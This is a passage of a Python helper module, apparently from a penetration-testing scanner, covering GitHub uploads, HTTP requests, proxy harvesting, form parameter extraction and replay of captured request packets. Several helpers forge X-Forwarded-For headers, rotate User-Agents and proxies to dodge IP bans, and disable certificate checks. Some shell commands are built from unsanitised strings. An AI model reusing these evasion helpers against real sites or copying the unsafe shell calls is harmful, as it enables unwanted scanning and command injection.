    # 得到的函数返回值为['a/1.txt','2.txt']

    tmp_get_file_name_value = [0]
    tmp_all_file_name_list = []

    def get_all_file_name_inside_func(f, e):
        folder = f
        ext_list = e
        import os
        tmp_get_file_name_value[0] += 1
        if tmp_get_file_name_value[0] == 1:
            if folder[-1] == '/':
                root_dir = folder[:-1]
            else:
                root_dir = folder

        allfile = os.listdir(folder)
        for each in allfile:
            each_abspath = os.path.join(folder, each)
            if os.path.isdir(each_abspath):
                get_all_file_name_inside_func(each_abspath, ext_list)
            else:
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(each)
                else:
                    for each_ext in ext_list:
                        if(each.split('.')[-1] == each_ext):
                            # print each
                            tmp_all_file_name_list.append(each)

        return tmp_all_file_name_list
    return get_all_file_name_inside_func(folder, ext_list)


def save2github(file_abs_path, repo_name, comment):
    # 将文件上传到github
    # arg1:文件绝对路经
    # arg2:远程仓库名
    # 提交的commit注释
    local_resp_path = HOME_PATH + "/" + repo_name
    filename = os.path.basename(file_abs_path)
    remote_resp_url = "https://github.com/3xp10it/%s.git" % repo_name
    if os.path.exists(local_resp_path) is False:
        os.system(
            "mkdir %s && cd %s && git init && git pull %s && git remote add origin %s && git status" %
            (local_resp_path, local_resp_path, remote_resp_url, remote_resp_url))
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in \
local_resp_path(>>%s),and this script is downloaded from remote github repo,\
you should rename your script if you want to upload it to git:)" % local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git push -u origin \
master" % (local_resp_path, comment))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is False:
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path\
(>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then\
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * &&  git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
%s && git push -u origin master" % (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is True:
        # 如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件
        # 不一致时,且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的
        # 处理方法,(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),虽然当远程仓库中不
        # 含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path \
(>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cd %s && rm -r .git" % local_resp_path)
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * && git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
%s && git push -u origin master" %
            (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False


def get_os_type():
    # 获取操作系统类型,返回结果为"Windows"或"Linux"
    return platform.system()


def post_request(url, data, verify=True):
    # 发出post请求
    # 第二个参数是要提交的数据,要求为字典格式
    # 返回值为post响应的html正文内容,返回内容为str类型
    # print("当前使用的data:")
    # print(data)
    # 这里的verify=False是为了防止https服务器证书无法通过校验导致无法完成https会话而设置的,并不一定有效,后期可能
    # 要改

    import mechanicalsoup
    browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
    ua = get_random_ua()
    browser.session.headers.update({'User-Agent': '%s' % ua})
    x_forwarded_for = get_random_x_forwarded_for()
    browser.session.headers.update({'X-Forwarded-For': '%s' % x_forwarded_for})

    if verify is False:
        page = browser.post(url, data=data, timeout=30, verify=False)
    if verify is True:
        page = browser.post(url, data=data, timeout=30)
    content = page.content
    import chardet
    bytes_encoding = chardet.detect(content)['encoding']
    return content.decode(encoding=bytes_encoding, errors="ignore")


def get_random_ua():
    # 得到随机user-agent值
    all_user_agents = [
        "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
        "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
        "Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
        "Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ja-jp) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ru-ru) AppleWebKit/533.2+ (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ca-es) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; de-de) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; el-gr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
    ]
    random_ua_index = random.randint(0, len(all_user_agents) - 1)
    ua = re.sub(r"(\s)$", "", all_user_agents[random_ua_index])
    return ua


def get_random_x_forwarded_for():
    # 得到随机x-forwarded-for值
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(range(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)


def get_random_header():
    headers = {"User-Agent": get_random_ua(),
               "Accept": "*/*",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               #"X-Requested-With": "XMLHttpRequest",
               "Connection": "keep-alive"
               }
    return headers


# 下面主要用于获取代理get_one_useful_proxy(),返回0则获取失败


# 代理验证,proxies() #传入一个字典
def proxies(urls={"http": "http://124.240.187.78:81"}):
    proxies = urls
    # timeout=60 设置超时时间60秒
    # res.status_code 查看返回网页状态码
    # verify = False 忽略证书
    try:
        res = requests.get(url="http://1212.ip138.com/ic.asp", proxies=proxies,
                           verify=False, timeout=60, headers=get_random_header())
        # print u"访问畅通!!!"
        # print res.content
        if res.status_code == 200:
            # print u"代理可用!"
            # print res.content
            # with open("1.txt",'wb') as f:
            # f.write(res.content)

            # print(urls)
            # print(u"访问没有问题,返回1")
            return proxies
        else:
            # print(urls)
            # print(u"访问不可用,返回0")
            return False
    except Exception as err:
        print(urls)
        print(err)
        print(u"访问异常,返回0")
        print("正在获取10个代理中,请耐心等待...")
        return False

    # 获取列表页数 并 生成列表超链接


def get_list_page(listurl="http://www.xicidaili.com/nt/"):
    # 获取列表页数
    import re
    doc = requests.get(url=listurl, headers=get_random_header()).text
    soup = BeautifulSoup(doc, 'lxml')
    page_html = soup.find("div", class_="pagination")
    page_list = re.findall(r"\d+", str(page_html))
    if page_list == []:
        return 0
    page_max = int(page_list[-2])
    # 生成列表超链接
    list_all = []
    import re
    for i in range(1, page_max + 1):
        url = re.sub('/\d+', '/%d' % i, listurl + "1", re.S)
        # print url
        list_all.append(url)
    else:
        # print list_all
        return list_all

# 抓取页面字段


def page_data(url="http://www.xicidaili.com/nn/1"):
    resule = []
    html = requests.get(url, headers=get_random_header()).text
    soup = BeautifulSoup(html, 'lxml')
    table = soup.select('table tr')
    for tr in table:
        # print tr
        td = tr.select('td')
        iplist = []
        for ip in td:
            # print ip.string
            iplist.append(ip.string)
        # print iplist
        if iplist:
            resule.append(iplist[5].lower() + ':' + iplist[5].lower() +
                          '://' + iplist[1] + ':' + iplist[2])
    return resule
    # 获取数据

# 追加保存数据


def save_ip(ip):
    with open('proxy.txt', 'a') as f:
        f.write(ip + "\n")


def check_banned(url):
    # 检测当前ip是否被拉黑
    result = get_request(url, by="MechanicalSoup")
    if result['code'] != 0:
        return False
    else:
        result = get_request(
            url, proxy_url=get_one_useful_proxy(), by="MechanicalSoup")
        if result['code'] != 0:
            return True
        else:
            result = get_request(
                url, proxy_url=get_one_useful_proxy(), by="MechanicalSoup")
            if result['code'] != 0:
                return True
            else:
                return False


def get_proxy_list():
    # 尝试一直获取并初步验证代理,直到得到10个代理
    import re
    import time

    print(
        "如果是第一次获取代理[也即同目录下没有proxy.txt,或者同目录下有proxy.txt但是该文件的时限超过了3天]请耐心等待,现在尝试获取10个代理,一般花费5分钟左右,你可以去喝杯咖啡")
    list_url = get_list_page(listurl="http://www.xicidaili.com/nt/")
    if list_url == 0:
        return 0
    start_time = time.time()
    for url in list_url:
        iplist = page_data(url)
        for ip in iplist:
            arr = re.split(':', ip)
            # print type(arr),arr,arr[0],arr[1],arr[2],arr[3]
            parame = {arr[0]: arr[1] + ':' + arr[2] + ':' + arr[3]}
            res = proxies(parame)
            if res:
                # print u"file_put" #写入文件
                save_ip(str(arr[1] + ':' + arr[2] + ':' + arr[3]))
                with open("proxy.txt", "r+") as f:
                    got_list = f.readlines()
                if len(got_list) < 10:
                    # 只获取10个代理,获取所有代理要花很多时间
                    continue
                else:
                    spend_time = time.time() - start_time
                    print("获取10个代理花费时间:%s" % seconds2hms(spend_time))
                    return

            else:
                # 访问不可用时走这里的流程
                pass


def check_proxy_and_rewrite_thread(parame):
    res = proxies(parame)
    if res:
        for key in parame:
            print("parame[key] is:")
            print(parame[key])
            save_ip(parame[key])
    else:
        pass


def get_one_proxy():
    import random
    import os
    import re
    proxy_count = 0
    proxy_list = []
    if os.path.exists("proxy.txt"):
        if file_outof_date("proxy.txt"):
            os.system("rm proxy.txt")
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0

        with open("proxy.txt") as f:
            for each_line in f:
                each_line = re.sub(r"\s$", "", each_line)
                proxy_count += 1
                proxy_list.append(each_line)

        if proxy_count > 10:
            pass
        else:
            # 小于10个代理则重新获取
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0

    else:
        a = get_proxy_list()
        if a == 0:
            print("try to get proxy ip list,but the server blocked it")
            return 0

    final_list = []
    with open("proxy.txt", "r+") as f:
        for each_line in f:
            each_line = re.sub(r"\s$", "", each_line)
            final_list.append(each_line)
    return_value = random.choice(final_list)
    return return_value


def get_one_useful_proxy():
    # 相比get_one_proxy函数,这个函数得到的是经过验证的有效的代理
    try_proxy_count = 0
    while 1:
        proxy_ip = get_one_proxy()
        try_proxy_count += 1
        if try_proxy_count > 10:
            # 随便10个代理都没用时重新获取代理列表
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0
            try_proxy_count = 0
            continue

        if proxy_ip == 0:
            print("大爷,不要用代理了,获取代理列表失败了")
            return 0
        else:
            parame_first_part = proxy_ip.split(":")[0]
            parame_second_part = proxy_ip
            parame = {parame_first_part: parame_second_part}
            if proxies(parame):
                print("恭喜大爷,得到的有效的代理:" + proxy_ip)
                return proxy_ip
            else:
                continue


def get_param_list_from_param_part(param_part):
    # eg. get ['a','b'] from 'a=1&b=2'
    param_part_list = param_part.split("&")
    return_list = []
    for each in param_part_list:
        return_list.append(each.split("=")[0])
    return return_list


def get_param_part_from_content(content):
    form_part_value = re.search(
        r'''<form[^<>]+>(((?!=</form>)[\s\S])+)</form>''', content, re.I).group(1)
    input_param_list = re.findall(
        r'''(<[^<>]+\s+name\s*=\s*['"]?([^\s'"]+)['"]?[^<>]*>)''', form_part_value, re.I)
    param_part_value = ""
    param_name_list = []
    for each in input_param_list:
        param_name = each[-1]
        if param_name not in param_name_list:
            # 防止有重复的参数
            param_name_list.append(param_name)
            exist_file_param = re.search(
                r'''type=('|")?file('|")?''', each[0], re.I)
            if exist_file_param:
                # 如果当前参数是file参数,表示要上传文件,这种特殊情况返回param_name=filevalue
                param_part_value += (param_name + "=filevalue&")
            else:
                # 当前参数不是file参数
                exist_default_value = re.search(
                    r'''value=('|")?([^'"<>]*)('|")?''', each[0], re.I)
                if exist_default_value:
                    # 如果有默认值
                    default_value = exist_default_value.group(2)
                    default_value = re.sub(r"\s+", "+", default_value)
                    param_part_value += (param_name + "=" +
                                         default_value + "&")
                else:
                    # 如果没有默认值
                    if re.search(r'''required=('|")?required('|")?''', each[0], re.I):
                        # 处理必须要填的参数
                        param_part_value += (param_name +
                                             "=required_param_value&")
                    else:
                        param_part_value += (param_name + "=&")

    if param_part_value != "" and param_part_value[-1] == "&":
        param_part_value = param_part_value[:-1]
    return param_part_value


# 上面主要用于获取代理，用法为get_one_useful_proxy(),返回0则获取失败


def test_speed(address):
    # test ping speed
    a = get_string_from_command("ping %s -c 15" % address)
    all = re.findall(r"time=(\S+)", a, re.I)
    if len(all) < 12:
        print("error")
        return
    sum = 0
    i = 0
    for each in all:
        i += 1
        if i <= 12:
            sum += float(each)
    print("ping speed time:\n%s,%s" % (address, str(sum / 10)))
    return sum / 12


def get_request(url, by="MechanicalSoup", proxy_url="", cookie="", delay_switcher=1):
    # 如果用在爬虫或其他需要页面执行js的场合,用by="selenium_phantom_js",此外用by="MechanicalSoup"
    # 因为by="selenium_phantom_js"无法得到http的响应的code(状态码)
    # 如果用selenium,用firefox打开可直接访问,要是用ie或chrome打开则要先安装相应浏览器驱动
    # 默认用MechanicalSoup方式访问url
    # 发出get请求,返回值为一个字典,有5个键值对
    # eg.{"code":200,"title":None,"content":"",'has_form_action',"",'form_action_value':""}
    # code是int类型
    # title如果没有则返回None,有则返回str类型
    # content如果没有则返回""
    # has_form_action的值为True或False,True代表url对应的html中有表单可提交
    # form_action_value的值为has_form_action为True时要测试的url
    # form_action_value is not from the value in "<form action="value_part">"
    # form_action_value is the final request url the browser should make to the server
    # 如http://www.baidu.com/1.php^a=1&b=2 (post提交表单类型的测试url)
    # 如http://www.baidu.com/1.php?a=1&b=2 (get提交表单类型的测试url)
    # by是使用方法,有两种:MechanicalSoup|chromedriver
    # https://github.com/hickford/MechanicalSoup
    # selenium+chromedriver,chromedriver不能得到code,默认用MechanicalSoup方法
    # delay_switcher用于设置当前调用get_request函数时是否要按照延时设置来延时,如果设置为0则不需要延时,这种情况用于
    # 一些不担心被服务器禁止访问的场合
    # current_url is the true url the browser is visiting.
    # if redirect exist,return_current_url is not url
    # if no redirect exist,return_current_url is url
    # 其中selenium设置phantomjs的cookie的正确方法为
    # https://stackoverflow.com/questions/35666067/selenium-phantomjs-custom-headers-in-python

    # 这里的delay用于所有用到get_request函数的http请求的时间隔,eg:在3xp10it扫描工具的爬虫模块中用到这里
    '''
    global DELAY
    if delay_switcher == 1:
        # 如果打开了delay开关则需要根据配置文件中的delay参数来延时访问
        if DELAY != "":
            import time
            time.sleep(DELAY)
        else:
            pass
    '''

    code = None
    title = None
    content = None
    has_form_action = False
    form_action_value = ""
    current_url = url

    if by == "selenium_phantom_js":

        if module_exist("selenium") is False:
            os.system("pip3 install selenium")
        from selenium import webdriver
        # from selenium.common.exceptions import TimeoutException
        result = get_string_from_command("phantomjs --help")
        if re.search(r"(not found)|(不是内部或外部命令)|(Unknown command)", result, re.I):
            if platform.system() == "Darwin":
                os.system("brew install phantomjs")
            elif platform.system() == 'Linux':
                os.system("apt-get install phantomjs")
            elif platform.system() == 'Windows':
                import wget
                try:
                    wget.download(
                        "https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-windows.zip", out="phantomjs.zip")
                except:
                    print(
                        "Please download phantomjs from the official site and add the executeable file to your path")
                    input("下载速度太慢,还是手工用迅雷下载吧,下载后将可执行文件phantomjs.exe存放到PATH中,再按任意键继续...")
        import time

        if proxy_url == "" or proxy_url == 0:
            service_args_value = ['--ignore-ssl-errors=true',
                                  '--ssl-protocol=any', '--web-security=false']
        if proxy_url != "" and proxy_url != 0:
            proxy_type = proxy_url.split(":")[0]
            proxy_value_with_type = proxy_url.split("/")[-1]
            service_args_value = ['--ignore-ssl-errors=true', '--ssl-protocol=any', '--web-security=false',
                                  '--proxy=%s' % proxy_value_with_type, '--proxy-type=%s' % proxy_type]
            service_args_value.append('--load-images=no')  # 关闭图片加载
            service_args_value.append('--disk-cache=yes')  # 开启缓存

        try:
            # from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
            # dcap = dict(DesiredCapabilities.PHANTOMJS)

            ua = "Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0"
            #headers = {'User-Agent': '%s' % get_random_ua(),'Cookie': '%s' % cookie}
            if cookie != "":
                headers = {'User-Agent': '%s' % ua, 'Cookie': '%s' % cookie, 'Referer': '%s' %
                           get_http_domain_from_url(url)}
            else:
                headers = {'User-Agent': '%s' % ua,
                           'Referer': '%s' % get_http_domain_from_url(url)}
            for key in headers:
                capability_key = 'phantomjs.page.custom_headers.{}'.format(key)
                webdriver.DesiredCapabilities.PHANTOMJS[capability_key] = headers[key]
            driver = webdriver.PhantomJS(service_args=service_args_value)

            # driver.implicitly_wait(20)
            # driver.set_page_load_timeout(20)

            driver.get(url)

            # driver.get_screenshot_as_file("/tmp/PhantomJSPic" +
            # get_http_domain_from_url(url).split("/")[-1] + str(random.random()))
            # selenium无法得到code,先根据返回titile和内容来看如果是正常返回,则这里将code赋值为200
            # 如果title和内容异常(如包含"页面不存在"),则将这个请求重新发给get_request(url,by="MechanicalSoup")
            # 这里将正常的http网页用phantomJS来请求,如果发现异常则交给MechanicalSoup重新访问
            code = 200
            title = driver.title
            print(title)
            content = driver.page_source
            # return_current_url is the true url the browser is visiting.
            # if redirect exist,return_current_url is not url
            # if no redirect exist,return_current_url is url
            current_url = driver.current_url
            # 表单页面处理
            try:
                # form = driver.find_element_by_css_selector('form').submit()
                has_form_action = True
                if re.search(r'''<form[^<>]*method=('|")?get('|")?[^<>]*>''', content, re.I):
                    # 说明是get请求提交的参数
                    # get提交表单的处理
                    form_action_value = driver.current_url
                else:
                    if re.search(r'''<form[^<>]*method=('|")?post('|")?[^<>]*>''', content, re.I):
                        # post提交表单的处理采用自行查找所有表单中的参数
                        # post的测试url中有^,这是人为添加的,便于放到数据库中
                        form_action_value += (driver.current_url + "^")

                    else:
                        # 其他情况当作get请求,并用正则找出表单中的参数(不用selenium的submit)
                        form_action_value += (driver.current_url + "?")

                    pure_content = re.sub(r"<!--.*-->", "", content)
                    param_part_value = get_param_part_from_content(
                        pure_content)
                    form_action_value += param_part_value

            except selenium.common.exceptions.NoSuchElementException:
                has_form_action = False
                # print("没找到表单...")
            #print("len content is :\n" + str(len(content)))
            print("[title:" + title + "]" + url)

        except Exception as e:
            print(e)
        finally:
            driver.quit()

        if content is None or title is None or (re.search(r"(页面不存在)|(未找到页面)|(page\s+not\s+found)|(404\s+not\s+found)", content, re.I) and len(content) < 10000) or re.search(r"404", title, re.I):
            if content and re.search(r'''<form\s+[^<>]*>''', content, re.I):
                input("需要调整代码!!!!!!!!!")
            return get_request(url, by="MechanicalSoup", proxy_url=proxy_url, cookie=cookie, delay_switcher=delay_switcher)

        return {
            'code': code,
            'title': title,
            # 下面比较特殊,PhantomJS得到的html不用decode,直接就是string类型
            'content': content,
            #True or False
            'has_form_action': has_form_action,
            # eg,https://www.baidu.com^a=1&b=2
            # eg,https://www.baidu.com/?a=1&b=2
            # 上面?表示formAction对应get请求,^表示formAction对应post请求
            'form_action_value': form_action_value,
            'current_url': current_url}

    else:
        import mechanicalsoup

        try:
            browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
            #ua = get_random_ua()
            ua = "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)"
            browser.session.headers.update({'User-Agent': '%s' % ua})
            browser.session.headers.update(
                {'Referer': '%s' % get_http_domain_from_url(url)})

            # headers=browser.session.headers
            # if 'Cookie' in headers:
            #    original_cookie=headers['Cookie']
            #    print(orinal_cookie)

            if cookie == "":
                # 调用当前函数时没有传入cookie
                pass
            else:
                # 调用当前函数时传入了cookie参数则更新cookie
                browser.session.headers.update({'Cookie': '%s' % cookie})

            x_forwarded_for = get_random_x_forwarded_for()
            browser.session.headers.update(
                {'X-Forwarded-For': '%s' % x_forwarded_for})

            # 添加verify=False用于访问形如https://forum.90sec.org等服务器公钥没有通过验证的url的访问
            result = browser.get(url,
                    timeout=30, verify=False)
            if url != result.url:
                # redirect url
                current_url = result.url
            current_url = result.url
            code = result.status_code
            # content是bytes类型
            content = result.content
            import chardet
            bytes_encoding = chardet.detect(content)['encoding']
            # 使用检测出来的编码方式解码
            #content = content.decode(bytes_encoding)
            content = content.decode(encoding=bytes_encoding, errors="ignore")
            title = BeautifulSoup(content, "lxml").title
            if title is not None:
                title_value = title.string
            else:
                title_value = None

            # 看看有没有表单
            a = re.search(
                r'''<form[^<>]*action=('|")?([^\s'"<>]*)('|")?[^<>]*>''', content, re.I)
            if not a and re.search(r'''<form\s+((?!action|>|<).)*>''', content, re.I):
                # 有form没有action则调用selenium_phantom_js来重新发送get请求,因为这种情况无法获得表单要提交的url
                return get_request(url, by="selenium_phantom_js", proxy_url=proxy_url, cookie=cookie, delay_switcher=delay_switcher)
            if a:
                pure_action_value = a.group(2)
                if pure_action_value[0] == '/':
                    pure_action_value = get_http_netloc_from_url(
                        current_url) + pure_action_value
                elif re.match(r"http(s)?://.*", pure_action_value, re.I):
                    pure_action_value = pure_action_value
                elif re.match(r"#+", pure_action_value) or re.match(r"\s*", pure_action_value):
                    pure_action_value = current_url
                else:
                    pure_action_value = get_value_from_url(
                        current_url)['y2'] + "/" + pure_action_value

                # 有表单
                has_form_action = True
                pure_content = re.sub(r"<!--.*-->", "", content)
                param_part_value = get_param_part_from_content(pure_content)
                if re.search(r'''<form[^<>]*method=('|")?get('|")?[^<>]*>''', content, re.I):
                    # get提交表单的处理
                    form_action_value += pure_action_value + "?" + param_part_value
                elif re.search(r'''<form[^<>]*method=('|")?post('|")?[^<>]*>''', content, re.I):
                    # post提交表单的处理采用自行查找所有表单中的参数
                    # post的测试url中有^,这是人为添加的,便于放到数据库中
                    form_action_value += pure_action_value + "^" + param_part_value
                else:
                    # 对于非get或post的表单默认用get来提交(一般是js提交)
                    form_action_value += pure_action_value + "?" + param_part_value

        except:
            # 请求次数过多时被目标服务器禁止访问时
            code = 0
            title_value = "页面载入出错,但是这个页面有可能是存在的,只是因为访问过多被暂时拒绝访问,如果当前url是https的,也有可能是代码没有处理好ssl的证书问题"
            content = 'can not get html content this time,may be blocked by the server to request'

        return_value = {
            'code': code,
            'title': title_value,
            'content': content,
            'has_form_action': has_form_action,
            'form_action_value': form_action_value,
            'current_url': current_url}
        return return_value

def get_today_date():
    return time.strftime('%Y-%m-%d',time.localtime(time.time()))

def get_now_time():
    return time.strftime('%H:%M:%S',time.localtime(time.time()))

def get_now_date_time():
    return time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))

def get_localtime_from_utctime(utctime):
    import datetime
    #eg.utctime = "2017-07-28T08:28:47Z"
    UTC_FORMAT = "%Y-%m-%dT%H:%M:%SZ"
    utc_time = datetime.datetime.strptime(utctime, UTC_FORMAT)
    local_time = utc_time + datetime.timedelta(hours=8)
    return str(local_time)

def check_start_time(want_time):
    # eg:a="11:59:59"
    import time
    while True:
        a = time.strftime('%H:%M:%S', time.localtime(time.time()))
        print(a)
        if (a[0:2] == want_time[0:2] and a[3:5] == want_time[3:5] and a[6:8] == want_time[6:8]):
            break
        else:
            print("还没到点...")
            time.sleep(0.5)
            continue
    time.sleep(0.7)
    a = time.strftime('%H:%M:%S', time.localtime(time.time()))
    print("到点,现在时刻:%s" % a)


def send_http_packet(string, http_or_https, proxies={},encoding="chardet"):
    # 发http请求包封装函数,string可以是burpsuite等截包工具中拦截到的包
    # string要求是burpsuite中抓包抓到的字符串,也即已经经过urlencode
    # proxy_url为代理地址,eg."http://127.0.0.1:8080"
    # encoding用于解码服务器返回的内容,默认使用chardet检测出服务器的编码是什么,但有时候chardet检测的不对,这种情况需要手动设置encoding的值
    # 返回的内容为一个字典,{'code':xxx,'headers':xxx,'html':'xxx'},其中code为int类型,headers是dict类型,html为str类型
    retry_count=0
    while True:
        try:
            return_value = {'code': 0,'headers': {},'html': ''}
            string = re.sub(r"^\s", "", string)
            uri_line = re.search(r"(^.+)", string).group(1)
            header_dict = {}
            header_list = re.findall(r"([^:\s]+): ([^\r\n]+)((\n)|(\r\n))", string)
            for each in header_list:
                header_dict[each[0]] = each[1]
            url = http_or_https + "://" + re.search(r"Host: (\S+)", string, re.I).group(
                1) + re.search(r" (\S+)", uri_line, re.I).group(1)
            if string[:3] == "GET":
                if proxies == {}:
                    res = requests.get(url, headers=header_dict,timeout=30,verify=False)
                else:
                    res = requests.get(url, headers=header_dict, proxies=proxies,timeout=30,verify=False)
            elif string[:4] == "POST":
                post_string = re.search(r"((\r\n\r\n)|(\n\n))(.*)", string).group(4)
                post_string_bytes = post_string.encode("utf8")
                if proxies == {}:
                    res = requests.post(url, headers=header_dict,
                                        data=post_string_bytes,timeout=30,verify=False)
                else:
                    res = requests.post(url, headers=header_dict,
                                        data=post_string_bytes, proxies=proxies,timeout=30,verify=False)
            code = res.status_code
            headers = res.headers
            content = res.content
            if encoding=='chardet':
                import chardet
                bytes_encoding = chardet.detect(content)['encoding']
                if bytes_encoding is None:
                    bytes_encoding="utf8"
            else:
                bytes_encoding=encoding
            content = content.decode(encoding=bytes_encoding, errors="ignore")
            res.close()
            del(res) 
            return_value['code'] = code
            return_value['headers'] = headers
            return_value['html'] = content
            return return_value
        except:
            retry_count+=1
            if retry_count>=5:
                print("异常,访问了5次还是没有结果")
                print("当前请求包是:\n"+string)
                return None
            time.sleep(3)
            continue


def set_string_to_clipboard(string):
    import pyperclip
    pyperclip.copy(string)
    if string!=pyperclip.paste():
        pyperclip.copy(string)


def keep_session(url, cookie):
    # 保持服务器上的session长久有效
    import time
    while 1:
        get_request(url, cookie=cookie, by="MechanicalSoup")
        time.sleep(60)


def get_urls_from_file(file):
    # 从文件中获取所有url
    f = open(file, "r+")
    content = f.read()
    f.close()
    allurls = []
    all = re.findall('(http(\S)+)', content, re.I)
    for each in all:
        allurls.append(each[0])
    return allurls


def get_title_from_file(file):
    # 等到文件中的所有url对应的title
    target_allurls = get_urls_from_file(file)
    print("a output file:/tmp/result.txt")
    writed_urls = []
    for each in target_allurls:
        f = open("/tmp/result.txt", "a+")
        tmp = urlparse(each)
        http_domain = tmp.scheme + '://' + tmp.hostname
        title = get_request(http_domain)['title']
        time.sleep(1)
        try:
            if http_domain not in writed_urls:
                each_line_to_write = http_domain + '\r\n' + 'upon url is:' + title + '\r\n'
                print(each_line_to_write)
                f.write(each_line_to_write)
                writed_urls.append(http_domain)
        except:
            pass
    f.close()


def check_file_has_logo(file_abs_path):
    a = '### blog: http://3xp10it.cc'
    if not os.path.exists(file_abs_path):
        return False
    with open(file_abs_path, 'r') as foo:
        content = foo.readlines()
    for line in content:
        if a in line:
            return True
    return False


def write_code_header_to_file(file_abs_path, function, date, author, blog):
    f = open(file_abs_path, "a+")
    first_line = "#############################################################\n"
    f.write(first_line)
    f.close()
    figlet2file("3xp10it", file_abs_path, False)
    f = open(file_abs_path, "r+")
    all = f.readlines()
    f.close()
    f = open("/tmp/1", "a+")
    for each in all:
        if(each[0:40] != "#" * 40):
            f.write("### " + each)
        else:
            f.write(each)
    f.close()
